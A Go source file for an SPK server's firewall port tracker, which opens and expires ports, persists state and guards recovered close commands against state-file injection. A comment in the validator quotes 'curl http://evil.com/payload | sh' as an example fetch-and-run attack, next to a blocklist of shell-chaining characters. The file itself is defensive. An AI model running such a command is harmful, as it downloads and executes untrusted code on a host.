// Copyright (c) 2024-2026 Jack L. (Cpt-JackL) (https://jack-l.com)
// SPDX-License-Identifier: MIT
// Package server implements the SPK server.
package server

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// PortEntry tracks an opened port for a specific client IP.
type PortEntry struct {
	IP        string    `json:"ip"`
	Port      string    `json:"port"`     // e.g., "t22", "u53", "all"
	Proto     string    `json:"proto"`    // "tcp", "udp", "all"
	PortNum   string    `json:"port_num"` // numeric port, e.g. "22"
	OpenedAt  time.Time `json:"opened_at"`
	ExpiresAt time.Time `json:"expires_at"`
	Command   string    `json:"open_command"`  // The command that was executed to open
	CloseCmd  string    `json:"close_command"` // The command to execute on close
}

// Tracker manages open ports, timeouts, and fail-safe state persistence.
type Tracker struct {
	mu                sync.Mutex
	entries           map[string]*PortEntry // key: "IP:port:proto"
	statePath         string
	logger            serverLogger
	closePortsOnCrash bool          // Whether to execute close commands on crash recovery
	cmdTimeout        time.Duration // Timeout for command execution
	logCmdExec        bool          // Log each command before execution (debug)
}

// NewTracker creates a new port tracker with state persistence.
// Optional cmdTimeout overrides the default 30s safety-net timeout for commands.
func NewTracker(statePath string, logger serverLogger, closePortsOnCrash bool, opts ...time.Duration) *Tracker {
	timeout := 30 * time.Second
	if len(opts) > 0 && opts[0] > 0 {
		timeout = opts[0]
	}
	t := &Tracker{
		entries:           make(map[string]*PortEntry),
		statePath:         statePath,
		logger:            logger,
		closePortsOnCrash: closePortsOnCrash,
		cmdTimeout:        timeout,
	}
	// Recover state from previous run
	t.recoverState()
	return t
}

// entryKey generates a unique key for a port entry.
func entryKey(ip, port, proto string) string {
	return fmt.Sprintf("%s:%s:%s", ip, port, proto)
}

// Add records a newly opened port and persists state.
func (t *Tracker) Add(entry *PortEntry) {
	t.mu.Lock()
	defer t.mu.Unlock()

	key := entryKey(entry.IP, entry.PortNum, entry.Proto)
	t.entries[key] = entry
	t.saveState()
}

// Remove removes a port entry and persists state.
func (t *Tracker) Remove(ip, portNum, proto string) {
	t.mu.Lock()
	defer t.mu.Unlock()

	key := entryKey(ip, portNum, proto)
	delete(t.entries, key)
	t.saveState()
}

// Has returns true if a port entry exists for the given IP, port, and protocol.
func (t *Tracker) Has(ip, portNum, proto string) bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	_, ok := t.entries[entryKey(ip, portNum, proto)]
	return ok
}

// RefreshExpiry updates the expiry time for an existing entry without
// touching the firewall. This is used when a duplicate open request arrives --
// the port is already open, so we just extend the timeout.
func (t *Tracker) RefreshExpiry(ip, portNum, proto string, newExpiry time.Time) {
	t.mu.Lock()
	defer t.mu.Unlock()
	key := entryKey(ip, portNum, proto)
	if e, ok := t.entries[key]; ok {
		e.ExpiresAt = newExpiry
		t.saveState()
	}
}

// TryReserve atomically checks whether an entry already exists and, if not,
// inserts the given entry as a reservation.  Returns (true, nil) when the
// reservation succeeded (caller should proceed to run the open command).
// Returns (false, existing) when the key is already tracked (caller should
// RefreshExpiry instead of opening again).
func (t *Tracker) TryReserve(entry *PortEntry) (bool, *PortEntry) {
	t.mu.Lock()
	defer t.mu.Unlock()
	key := entryKey(entry.IP, entry.PortNum, entry.Proto)
	if existing, ok := t.entries[key]; ok {
		return false, existing
	}
	t.entries[key] = entry
	t.saveState()
	return true, nil
}

// GetExpired returns all entries that have exceeded their timeout.
func (t *Tracker) GetExpired() []*PortEntry {
	t.mu.Lock()
	defer t.mu.Unlock()

	now := time.Now()
	var expired []*PortEntry
	for _, e := range t.entries {
		if now.After(e.ExpiresAt) {
			expired = append(expired, e)
		}
	}
	return expired
}

// GetByIP returns all entries for a specific client IP.
func (t *Tracker) GetByIP(ip string) []*PortEntry {
	t.mu.Lock()
	defer t.mu.Unlock()

	var result []*PortEntry
	for _, e := range t.entries {
		if e.IP == ip {
			result = append(result, e)
		}
	}
	return result
}

// GetAll returns all tracked entries.
func (t *Tracker) GetAll() []*PortEntry {
	t.mu.Lock()
	defer t.mu.Unlock()

	result := make([]*PortEntry, 0, len(t.entries))
	for _, e := range t.entries {
		result = append(result, e)
	}
	return result
}

// StartExpiryWatcher runs a goroutine that checks for expired ports.
// It sleeps adaptively: it wakes up exactly when the soonest entry expires
// rather than on a fixed tick, so short open durations are closed promptly.
// maxInterval is the upper bound on how long the watcher sleeps between checks
// (used when no entries are present or all expiries are far in the future).
func (t *Tracker) StartExpiryWatcher(maxInterval time.Duration) {
	go func() {
		const minSleep = 100 * time.Millisecond
		for {
			time.Sleep(t.sleepUntilNextExpiry(maxInterval, minSleep))
			expired := t.GetExpired()
			for _, entry := range expired {
				t.logger.Printf("[EXPIRED] Closing port %s/%s for %s (open duration elapsed at %s)",
					entry.PortNum, entry.Proto, entry.IP, entry.ExpiresAt.Format(time.RFC3339))
				if t.logCmdExec && entry.CloseCmd != "" {
					t.logger.Printf("[CMD-EXEC] %s", entry.CloseCmd)
				}
				if _, err := ExecuteCommandTimeout(entry.CloseCmd, t.cmdTimeout); err != nil {
					t.logger.Printf("[ERROR] Failed to close port %s/%s for %s: %v",
						entry.PortNum, entry.Proto, entry.IP, err)
				}
				t.Remove(entry.IP, entry.PortNum, entry.Proto)
			}
		}
	}()
}

// sleepUntilNextExpiry returns how long the expiry watcher should sleep before
// its next check. It finds the soonest ExpiresAt across all tracked entries and
// returns that remaining duration, bounded between minSleep and maxInterval.
func (t *Tracker) sleepUntilNextExpiry(maxInterval, minSleep time.Duration) time.Duration {
	t.mu.Lock()
	defer t.mu.Unlock()
	now := time.Now()
	next := maxInterval
	for _, e := range t.entries {
		remaining := e.ExpiresAt.Sub(now)
		if remaining > 0 && remaining < next {
			next = remaining
		}
	}
	if next < minSleep {
		next = minSleep
	}
	return next
}

// CloseAll closes all tracked ports (used for graceful shutdown).
func (t *Tracker) CloseAll() {
	entries := t.GetAll()
	for _, entry := range entries {
		t.logger.Printf("[SHUTDOWN] Closing port %s/%s for %s", entry.PortNum, entry.Proto, entry.IP)
		if t.logCmdExec && entry.CloseCmd != "" {
			t.logger.Printf("[CMD-EXEC] %s", entry.CloseCmd)
		}
		if _, err := ExecuteCommandTimeout(entry.CloseCmd, t.cmdTimeout); err != nil {
			t.logger.Printf("[ERROR] Failed to close port %s/%s for %s during shutdown: %v",
				entry.PortNum, entry.Proto, entry.IP, err)
		}
		t.Remove(entry.IP, entry.PortNum, entry.Proto)
	}
}

// saveState persists current tracking state to disk for crash recovery.
func (t *Tracker) saveState() {
	data, err := json.MarshalIndent(t.entries, "", "  ")
	if err != nil {
		t.logger.Printf("[ERROR] Failed to marshal state: %v", err)
		return
	}
	if err := os.MkdirAll(filepath.Dir(t.statePath), 0750); err != nil {
		t.logger.Printf("[ERROR] Failed to create state directory: %v", err)
		return
	}
	if err := os.WriteFile(t.statePath, data, 0600); err != nil {
		t.logger.Printf("[ERROR] Failed to save state: %v", err)
	}
}

// recoverState loads state from disk and closes any ports that should have expired.
func (t *Tracker) recoverState() {
	const maxStateFileSize = 1 << 20 // 1 MB
	info, err := os.Stat(t.statePath)
	if err != nil {
		return // No state file, fresh start
	}
	if info.Size() > maxStateFileSize {
		t.logger.Printf("[WARN] State file too large (%d bytes), starting fresh", info.Size())
		return
	}
	data, err := os.ReadFile(t.statePath)
	if err != nil {
		return // Could not read state file, fresh start
	}

	var entries map[string]*PortEntry
	if err := json.Unmarshal(data, &entries); err != nil {
		t.logger.Printf("[WARN] Could not parse state file, starting fresh: %v", err)
		return
	}

	now := time.Now()
	for key, entry := range entries {
		// Validate recovered commands to prevent state file injection
		if entry.CloseCmd != "" && !isValidRecoveredCommand(entry.CloseCmd) {
			t.logger.Printf("[RECOVERY] Skipping entry with suspicious close command: %s:%s:%s",
				entry.IP, entry.PortNum, entry.Proto)
			continue
		}
		if now.After(entry.ExpiresAt) {
			// Port should have been closed - execute close command if configured
			if t.closePortsOnCrash {
				t.logger.Printf("[RECOVERY] Closing expired port %s/%s for %s", entry.PortNum, entry.Proto, entry.IP)
				if t.logCmdExec && entry.CloseCmd != "" {
					t.logger.Printf("[CMD-EXEC] %s", entry.CloseCmd)
				}
				if _, err := ExecuteCommandTimeout(entry.CloseCmd, t.cmdTimeout); err != nil {
					t.logger.Printf("[ERROR] Recovery close failed for %s/%s %s: %v",
						entry.PortNum, entry.Proto, entry.IP, err)
				}
			} else {
				t.logger.Printf("[RECOVERY] Skipping close for expired port %s/%s for %s (close_ports_on_crash=false)",
					entry.PortNum, entry.Proto, entry.IP)
			}
		} else {
			// Port still valid, keep tracking
			t.logger.Printf("[RECOVERY] Resuming tracking of port %s/%s for %s (expires %s)",
				entry.PortNum, entry.Proto, entry.IP, entry.ExpiresAt.Format(time.RFC3339))
			t.entries[key] = entry
		}
	}

	t.saveState()
}

// isValidRecoveredCommand checks if a recovered close command looks safe.
// This prevents state file injection attacks by using both a blocklist
// (metacharacters) and an allowlist (known firewall/networking binaries).
// The allowlist limits execution to commands that begin with a recognized
// firewall management tool, even if the state file is tampered.
func isValidRecoveredCommand(cmd string) bool {
	// Reject commands with injection/chaining patterns
	dangerous := []string{"&&", "||", ";", "`", "$(", "${", "\n", "\r", "|"}
	for _, s := range dangerous {
		if strings.Contains(cmd, s) {
			return false
		}
	}
	// Reject redirections which could write to arbitrary files
	if strings.ContainsAny(cmd, "<>") {
		return false
	}
	// Command should not be excessively long (max 1024 chars)
	if len(cmd) > 1024 {
		return false
	}

	// Allowlist: command must start with a known firewall/networking binary.
	// This catches tampered state files that pass the blocklist but attempt
	// to run arbitrary programs (e.g. "curl http://evil.com/payload | sh"
	// is blocked by "|" above, but "python3 -c 'import os; ...'" would not
	// be without the allowlist).
	allowedPrefixes := []string{
		// Linux
		"iptables ", "iptables -", "ip6tables ", "ip6tables -",
		"nft ", "nft -",
		"ufw ", "ufw -",
		"firewall-cmd ", "firewall-cmd -",
		"pfctl ", "pfctl -",
		"/sbin/iptables", "/sbin/ip6tables",
		"/usr/sbin/iptables", "/usr/sbin/ip6tables",
		"/usr/sbin/nft", "/usr/sbin/ufw",
		// Windows
		"netsh ", "netsh.exe ",
		"powershell -Command Remove-NetFirewallRule",
		"powershell.exe -Command Remove-NetFirewallRule",
		// macOS
		"/sbin/pfctl",
	}

	cmdLower := strings.ToLower(strings.TrimSpace(cmd))
	for _, prefix := range allowedPrefixes {
		if strings.HasPrefix(cmdLower, strings.ToLower(prefix)) {
			return true
		}
	}

	return false // Unknown binary -- reject
}

// ExecuteCommandTimeout runs a shell command with a timeout.
// If the command does not finish within the timeout, it is killed.
// On Unix, the command runs in its own process group so that all child
// processes (e.g. long-running ping spawned via sh -c) are killed together.
// Returns the combined stdout/stderr output and any error.
func ExecuteCommandTimeout(command string, timeout time.Duration) (string, error) {
	if command == "" {
		return "", nil
	}
	if timeout <= 0 {
		timeout = 30 * time.Second
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	// On Unix, place the child in its own process group so we can
	// kill the entire tree on timeout (not just the shell).
	setProcGroup(cmd)

	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("command start failed: %s: %w", command, err)
	}

	// Wait for the command in a goroutine.
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	timer := time.NewTimer(timeout)
	defer timer.Stop()

	select {
	case err := <-done:
		outStr := strings.TrimSpace(buf.String())
		if err != nil {
			return outStr, fmt.Errorf("command failed: %s\noutput: %s\nerror: %w", command, outStr, err)
		}
		return outStr, nil
	case <-timer.C:
		// Timeout: kill entire process group (Unix) or process (Windows).
		killProcessGroup(cmd)
		<-done // wait for process to actually exit
		outStr := strings.TrimSpace(buf.String())
		return outStr, fmt.Errorf("command timed out after %v: %s", timeout, command)
	}
}

// ExecuteCommand runs a shell command with a 30-second safety-net timeout.
func ExecuteCommand(command string) (string, error) {
	return ExecuteCommandTimeout(command, 30*time.Second)
}

// BuildCommand creates a firewall command from a template.
// Replaces {{IP}}, {{PORT}}, {{PROTO}} placeholders.
// Validates inputs to prevent command injection.
func BuildCommand(template, ip, port, proto string) string {
	if template == "" {
		return ""
	}
	// Sanitize IP - only allow valid IP characters (digits, dots, colons for IPv6, a-f)
	if ip != "" && !isValidIPString(ip) {
		return ""
	}
	// Sanitize port - only allow digits
	for _, c := range port {
		if c < '0' || c > '9' {
			return ""
		}
	}
	// Sanitize proto - only allow tcp/udp/all
	switch proto {
	case "tcp", "udp", "all", "":
		// OK
	default:
		return ""
	}

	cmd := strings.ReplaceAll(template, "{{IP}}", ip)
	cmd = strings.ReplaceAll(cmd, "{{PORT}}", port)
	cmd = strings.ReplaceAll(cmd, "{{PROTO}}", proto)
	return cmd
}

// isValidIPString checks if a string is a valid IP address.
func isValidIPString(ip string) bool {
	return net.ParseIP(ip) != nil
}
